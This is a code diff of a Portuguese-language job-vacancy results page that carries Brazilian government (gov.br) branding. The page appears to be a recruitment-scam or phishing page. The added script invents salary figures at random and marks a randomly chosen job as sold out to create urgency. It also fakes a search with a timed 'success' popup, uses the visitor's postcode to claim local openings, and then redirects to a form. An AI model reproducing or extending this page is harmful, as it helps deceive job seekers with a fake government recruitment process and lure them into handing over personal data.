+                    if (elementoCargo) {
                         elementoCargo.classList.remove('bg-gray-50', 'border-gray-300', 'hover:border-blue-500');
                         elementoCargo.classList.add('bg-red-50', 'border-red-300', 'opacity-75');
                         elementoCargo.setAttribute('data-disponivel', 'false');
 
-                        const titleH4 = elementoCargo.querySelector('h4');
-                        if (titleH4) {
-                            let titleFlexDiv = titleH4.parentNode;
-                            if (!titleFlexDiv || !titleFlexDiv.classList.contains('flex')) {
-                                titleFlexDiv = document.createElement('div');
-                                titleFlexDiv.className = 'flex items-center mb-2';
-                                h4.parentNode.insertBefore(titleFlexDiv, h4);
-                                titleFlexDiv.appendChild(h4);
-                            }
+                        const titulo = elementoCargo.querySelector('h4');
+                        if (titulo && !titulo.querySelector('.bg-red-500')) {
                             const badge = document.createElement('span');
                             badge.className = 'ml-3 bg-red-500 text-white text-xs px-2 py-1 rounded-full';
                             badge.textContent = 'ESGOTADO';
-                            titleFlexDiv.appendChild(badge);
+                            titulo.appendChild(badge);
                         }
 
-                        const flexDivContent = elementoCargo.querySelector('.flex-1');
-                        if (flexDivContent && !flexDivContent.querySelector('.text-red-600')) {
+                        const flexDiv = elementoCargo.querySelector('.flex-1');
+                        if (flexDiv && !flexDiv.querySelector('.text-red-600')) {
                             const mensagem = document.createElement('p');
                             mensagem.className = 'text-red-600 text-sm mt-2';
-                            mensagem.innerHTML = '<i class="fas fa-exclamation-triangle mr-1"></i> Vagas esgotadas para esta região. Tente novamente em 48h.';
-                            flexDivContent.appendChild(mensagem);
+                            mensagem.innerHTML = '<i class="fas fa-exclamation-triangle mr-1"></i>Vagas esgotadas para esta região. Tente novamente em 48h.';
+                            flexDiv.appendChild(mensagem);
                         }
 
-                        const button = elementoCargo.querySelector('button');
-                        if (button) {
-                            button.classList.remove('bg-green-600', 'hover:bg-green-700', 'text-white');
-                            button.classList.add('bg-gray-400', 'text-gray-600', 'cursor-not-allowed');
-                            button.textContent = 'Indisponível';
-                            button.disabled = true;
-                        }
-
-                        const salaryP = elementoCargo.querySelector('.font-medium.text-green-600');
-                        if(salaryP) {
-                            salaryP.classList.remove('text-green-600');
-                            salaryP.classList.add('text-red-600');
+                        const botao = elementoCargo.querySelector('button');
+                        if (botao) {
+                            botao.className = 'bg-gray-400 text-gray-600 px-4 py-2 rounded font-medium cursor-not-allowed';
+                            botao.textContent = 'Indisponível';
+                            botao.disabled = true;
                         }
                     }
                 }
 
-                // Simulate loading time and then display results
+                function consultarViaCEP() {
+                    const cep = localStorage.getItem('cep')?.replace(/\D/g, '') || '';
+
+                    if (cep.length === 8) {
+                        fetch(`https://viacep.com.br/ws/${cep}/json/`)
+                            .then(response => response.json())
+                            .then(data => {
+                                if (!data.erro) {
+                                    document.getElementById('cep-info').textContent = cep;
+                                    document.getElementById('localidade-info').textContent = data.localidade || 'Não informado';
+                                    document.getElementById('estado-info').textContent = data.uf || 'Não informado';
+                                    document.getElementById('bairro-info').textContent = data.bairro || 'Não informado';
+                                    document.getElementById('logradouro-info').textContent = data.logradouro || 'Não informado';
+                                    document.getElementById('codigo-regiao').textContent = data.ibge || 'Não informado';
+
+                                    const dadosParaSalvar = {
+                                        logradouro: data.logradouro || '',
+                                        bairro: data.bairro || '',
+                                        localidade: data.localidade || '',
+                                        uf: data.uf || '',
+                                        ibge: data.ibge || ''
+                                    };
+                                    localStorage.setItem('dadosLocalizacao', JSON.stringify(dadosParaSalvar));
+
+                                    // Atualiza o texto com UF e cidade aqui
+                                    document.getElementById('texto-localizacao-vagas').innerHTML = `
+                        <i class="fas fa-info-circle mr-2 text-blue-600"></i>
+                        Vagas disponíveis para ${data.localidade} - ${data.uf}. Selecione o cargo de interesse para prosseguir com a inscrição.
+                    `;
+                                } else {
+                                    document.getElementById('localidade-info').textContent = 'CEP não encontrado';
+                                    document.getElementById('estado-info').textContent = 'N/A';
+                                }
+                            })
+                            .catch(error => {
+                                console.error('Erro ao consultar ViaCEP:', error);
+                                document.getElementById('localidade-info').textContent = 'Erro na consulta';
+                                document.getElementById('estado-info').textContent = 'N/A';
+                            });
+                    }
+                }
+
+                consultarViaCEP();
+
+
+
+                document.getElementById('salario-auxiliar-admin').textContent = gerarSalarioAleatorio(3300, 4600);
+                document.getElementById('salario-auxiliar-producao').textContent = gerarSalarioAleatorio(3500, 4800);
+                document.getElementById('salario-auxiliar-secretaria').textContent = gerarSalarioAleatorio(3200, 4500);
+                document.getElementById('salario-auxiliar-seguranca').textContent = gerarSalarioAleatorio(3750, 4985);
+                document.getElementById('salario-auxiliar-limpeza').textContent = gerarSalarioAleatorio(3112, 4325);
+                document.getElementById('salario-auxiliar-cozinha').textContent = gerarSalarioAleatorio(3425, 4756);
+                document.getElementById('salario-tecnico-manutencao').textContent = gerarSalarioAleatorio(4200, 4985);
+                document.getElementById('salario-secretario-escolar').textContent = gerarSalarioAleatorio(4000, 4950);
+
+                tornarCargoAleatorioIndisponivel();
+
                 setTimeout(() => {
                     loadingSection.classList.add('hidden');
                     resultsSection.classList.remove('hidden');
 
-                    // If you want a random cargo to be unavailable, uncomment the line below:
-                    // tornarCargoAleatorioIndisponivel();
-
-                    const mostrarPopup = localStorage.getItem('mostrarPopupResultados');
-                    if (mostrarPopup === 'true') {
-                        validationPopup.classList.remove('hidden');
-                        localStorage.removeItem('mostrarPopupResultados');
-
-                        const messageEl = document.getElementById('validation-message');
-                        const detailsEl = document.getElementById('validation-details');
-                        messageEl.textContent = 'Busca finalizada com sucesso';
-                        detailsEl.textContent = 'Dados carregados e disponíveis para visualização';
-
+                    if (!validationPopup.classList.contains('hidden')) {
                         setTimeout(() => {
-                            validationPopup.classList.add('hidden');
-                        }, 2000);
+                            const messageEl = document.getElementById('validation-message');
+                            const detailsEl = document.getElementById('validation-details');
+
+                            messageEl.textContent = 'Busca finalizada com sucesso';
+                            detailsEl.textContent = 'Dados carregados e disponíveis para visualização';
+
+                            setTimeout(() => {
+                                validationPopup.classList.add('hidden');
+                            }, 1000);
+                        }, 1000);
                     }
+                }, 3000);
 
-                }, 3000); // 3 seconds loading simulation
-
-                // --- Job Selection Logic ---
                 cargoOptions.forEach(option => {
                     option.addEventListener('click', function () {
                         if (this.getAttribute('data-disponivel') === 'false') return;
@@ -1355,8 +769,8 @@
                         this.classList.remove('bg-gray-50');
                         this.classList.add('ring-2', 'ring-blue-500', 'bg-blue-50');
 
-                        const cargoNome = this.querySelector('h4').textContent.replace('• ', '').replace('ESGOTADO', '').trim();
-                        const cargoSalario = this.querySelector('.font-medium.text-green-600, .font-medium.text-red-600').textContent;
+                        const cargoNome = this.querySelector('h4').textContent;
+                        const cargoSalario = this.querySelector('.text-blue-600').textContent;
                         const salarioMaximo = cargoSalario.split(' - ')[1] || cargoSalario;
 
                         localStorage.setItem('cargoSelecionado', JSON.stringify({
@@ -1379,26 +793,28 @@
                     });
                 });
 
-                // --- "INICIAR INSCRIÇÃO" Button Click ---
                 document.getElementById('iniciar-inscricao').addEventListener('click', function () {
                     const currentParams = new URLSearchParams(window.location.search);
-                    // Redirect to the /formulario/index.html page, preserving current URL parameters (like CEP)
-                    window.location.href = `../formulario/index.html${currentParams.toString() ? '?' + currentParams.toString() : ''}`;
+                    window.location.href = '../formulario' + (currentParams.toString() ? '?' + currentParams.toString() : '');
                 });
             });
         </script>
 
     </main>
 
+    <!-- Footer -->
     <footer class="bg-[#0a1f44] text-white">
         <div class="container mx-auto px-6 py-4">
+            <!-- Logo -->
             <div class="py-6">
-                <img src="../images/1200px-Gov.br_logo.svg.png"
+                <img src="images/1200px-Gov.br_logo.svg-2.png"
                     alt="Government of Brazil logo showing gov.br in white text" class="w-40">
             </div>
 
+            <!-- Divider -->
             <div class="border-t border-gray-600"></div>
 
+            <!-- Navigation Menu -->
             <nav aria-label="Menu principal do rodapé">
                 <ul>
                     <li class="py-3">
@@ -1450,6 +866,7 @@
                 </ul>
             </nav>
 
+            <!-- Cookie Settings -->
             <div class="mt-6 flex items-center">
                 <button id="cookie-settings" class="flex items-center hover:text-gray-300"
                     aria-label="Redefinir configurações de cookies">
@@ -1458,6 +875,7 @@
                 </button>
             </div>
 
+            <!-- Social Networks -->
             <div class="redes-e-logos mt-8">
                 <div class="redes-sociais">
                     <div class="titulo text-sm font-bold mb-4">Redes sociais</div>
@@ -1488,6 +906,7 @@
         </div>
     </footer>
 
+    <!-- Search Modal -->
     <div id="search-modal" class="search-modal hidden">
         <div class="search-modal-content">
             <div class="search-modal-header">
@@ -1508,5 +927,9 @@
         </div>
     </div>
 
+    <!-- JavaScript -->
+    <script src="js/main-2.js"></script>
+
 </body>
+
 </html>
